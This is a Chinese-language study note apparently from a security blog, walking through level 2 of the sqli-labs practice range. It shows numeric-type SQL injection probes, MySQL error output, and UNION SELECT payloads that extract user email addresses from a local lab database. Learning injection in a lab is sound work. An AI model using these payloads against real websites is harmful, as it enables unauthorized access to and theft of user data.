+++
date = "2019-08-21T17:29:11+08:00"
menu = ""
categories = ["渗透学习笔记"]
tags = ["Sql-Lib靶场通关"]

banner = "banners/less2.png"
title = "Sql-Lib第二关"
description = "数字型的注入题"
images = []

+++

- 漏洞类型：GET - Error based - intiger based
- 目标网址（本地靶场）：http://www.sqllib.com/less-2/?id=
- 目标：获取网站用户的邮箱

---



# ① 判断接受的参数类型

## 单引号测试

```
id=1'
```

### 报错

> check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1

## 闭合前后单引号，布尔表达式测试

```
id=1' and '1
```

### 报错

> check the manual that corresponds to your MySQL server version for the right syntax to use near '' and '1 LIMIT 0,1' at line 1

## 运算操作符测试

```
id=2-1
```
**成功显示 "id=1" 时的信息！**

一开始，我们假设是字符型，通过 (id=1' and '1) 尝试闭合单引号，使得SQL语句能够正常带入数据库查询，但是失败了。

通过（id=2-1）正常显示 "id=1" 时的用户信息，说明当前传入的参数类型是数字型，支持运算操作符号。

# ② 通过 Union selecet 查询数据

```
① id=-1 union select null,id,email_id from security.emails limit m,1
② id=1 and 1=2 union select null,id,email_id from security.emails limit m,1
```

- m 范围 1~99 的数字

- "id=-数字" 和 "id=1 and 1=2" 效果是一样的，**都是为了使得正常的查询结果不存在**，而让数据库继续把 Union 后的查询语句，带入数据库查询，并回显信息。

接下来通过改变 m 的数值，能够查询出所有的用户邮箱信息。